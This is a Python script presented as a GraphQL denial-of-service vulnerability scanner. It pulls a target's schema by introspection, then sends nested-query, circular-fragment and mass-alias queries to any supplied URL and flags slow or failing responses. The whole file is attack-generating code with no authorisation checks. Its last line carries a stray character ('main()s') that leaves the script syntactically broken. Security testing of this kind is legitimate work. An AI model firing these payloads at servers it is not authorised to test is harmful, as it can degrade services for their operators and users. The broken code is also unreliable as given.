#!/usr/bin/env python3
"""
GraphQL DoS Vulnerability Scanner
Tests for common GraphQL DoS vectors including:
- Nested query attacks
- Circular fragment attacks
- Field duplication attacks
- Resource exhaustion via aliases
"""

import asyncio
import aiohttp
import argparse
from typing import Dict, Optional
from datetime import datetime

class GraphQLDoSChecker:
    def __init__(self, url: str, max_depth: int = 10, max_aliases: int = 1000):
        self.url = url
        self.max_depth = max_depth
        self.max_aliases = max_aliases
        self.schema = None
        self.query_type = None
        
    async def fetch_schema(self) -> Optional[Dict]:
        """Fetch the GraphQL schema using introspection"""
        introspection_query = """
        query IntrospectionQuery {
          __schema {
            queryType { name }
            types {
              name
              fields {
                name
                type {
                  name
                  ofType {
                    name
                    kind
                  }
                }
              }
            }
          }
        }
        """
        
        print("[*] Fetching GraphQL schema...")
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    self.url,
                    json={'query': introspection_query},
                    headers={'Content-Type': 'application/json'}
                ) as response:
                    if response.status == 200:
                        result = await response.json()
                        if 'data' in result:
                            self.schema = result['data']['__schema']
                            self.query_type = self.schema['queryType']['name']
                            print("[+] Schema fetched successfully")
                            return self.schema
                    print(f"[!] Failed to fetch schema: {response.status}")
                    return None
        except Exception as e:
            print(f"[!] Error fetching schema: {str(e)}")
            return None

    def generate_nested_query(self, depth: int) -> str:
        """Generate a deeply nested query for testing"""
        if not self.schema:
            return ""
        
        # Find a field that returns an object type for nesting
        nestable_field = None
        for type_info in self.schema['types']:
            if type_info['name'] == self.query_type:
                for field in type_info['fields']:
                    if field['type'].get('ofType', {}).get('kind') == 'OBJECT':
                        nestable_field = field['name']
                        break
                break
        
        if not nestable_field:
            return ""
        
        # Generate nested query
        query = f"query NestedQuery {{ {nestable_field} {{\n"
        current_depth = 0
        while current_depth < depth:
            query += "  " * (current_depth + 1) + f"{nestable_field} {{\n"
            current_depth += 1
        query += "  " * (depth + 1) + "id\n"  # Add a terminal field
        query += "}" * (depth + 1)
        query += "}"
        
        return query

    def generate_circular_fragment(self) -> str:
        """Generate a query with circular fragments"""
        return """
        query CircularQuery {
            ...FragmentA
        }
        fragment FragmentA on Query {
            ...FragmentB
        }
        fragment FragmentB on Query {
            ...FragmentC
        }
        fragment FragmentC on Query {
            ...FragmentA
        }
        """

    def generate_field_duplication(self, num_duplicates: int) -> str:
        """Generate a query with duplicated fields"""
        if not self.schema:
            return ""
            
        # Find a simple scalar field to duplicate
        scalar_field = None
        for type_info in self.schema['types']:
            if type_info['name'] == self.query_type:
                for field in type_info['fields']:
                    if not field['type'].get('ofType'):  # Simple scalar field
                        scalar_field = field['name']
                        break
                break
                
        if not scalar_field:
            return ""
            
        query = "query DuplicateQuery {\n"
        for i in range(num_duplicates):
            query += f"  field_{i}: {scalar_field}\n"
        query += "}"
        
        return query

    async def test_query(self, name: str, query: str) -> bool:
        """Test a query and measure response time"""
        print(f"\n[*] Testing {name}...")
        start_time = datetime.now()
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    self.url,
                    json={'query': query},
                    headers={'Content-Type': 'application/json'},
                    timeout=10
                ) as response:
                    duration = (datetime.now() - start_time).total_seconds()
                    status = response.status
                    try:
                        result = await response.json()
                    except:
                        result = await response.text()
                    
                    print(f"[+] Response time: {duration:.2f}s")
                    print(f"[+] Status code: {status}")
                    
                    # Analyze response for potential vulnerabilities
                    if status == 200 and duration > 5:
                        print(f"[!] Potential DoS vulnerability: High response time")
                        return True
                    elif status == 500:
                        print(f"[!] Potential DoS vulnerability: Server error")
                        return True
                    return False
                    
        except asyncio.TimeoutError:
            print(f"[!] Potential DoS vulnerability: Query timed out")
            return True
        except Exception as e:
            print(f"[!] Error testing query: {str(e)}")
            return False

    async def run_tests(self):
        """Run all DoS vulnerability tests"""
        if not await self.fetch_schema():
            print("[!] Failed to fetch schema. Exiting.")
            return
            
        vulnerabilities = []
        
        # Test 1: Nested Query Attack
        nested_query = self.generate_nested_query(self.max_depth)
        if nested_query and await self.test_query("Nested Query Attack", nested_query):
            vulnerabilities.append("Nested Query")
            
        # Test 2: Circular Fragment Attack
        circular_query = self.generate_circular_fragment()
        if await self.test_query("Circular Fragment Attack", circular_query):
            vulnerabilities.append("Circular Fragment")
            
        # Test 3: Field Duplication Attack
        duplication_query = self.generate_field_duplication(self.max_aliases)
        if duplication_query and await self.test_query("Field Duplication Attack", duplication_query):
            vulnerabilities.append("Field Duplication")
            
        # Summary
        print("\n=== Vulnerability Scan Summary ===")
        if vulnerabilities:
            print("[!] Potential DoS vulnerabilities found:")
            for vuln in vulnerabilities:
                print(f"  - {vuln}")
            print("\nRecommendations:")
            print("- Implement query depth limiting")
            print("- Add query complexity analysis")
            print("- Set timeouts for query execution")
            print("- Implement rate limiting")
        else:
            print("[+] No obvious DoS vulnerabilities detected")
            print("[*] Note: This does not guarantee the absence of vulnerabilities")

def main():
    parser = argparse.ArgumentParser(description='GraphQL DoS Vulnerability Scanner')
    parser.add_argument('url', help='GraphQL endpoint URL')
    parser.add_argument('--max-depth', type=int, default=10, help='Maximum query depth for nested attack (default: 10)')
    parser.add_argument('--max-aliases', type=int, default=1000, help='Maximum number of aliases for duplication attack (default: 1000)')
    
    args = parser.parse_args()
    
    checker = GraphQLDoSChecker(args.url, args.max_depth, args.max_aliases)
    asyncio.run(checker.run_tests())

if __name__ == "__main__":
    main()s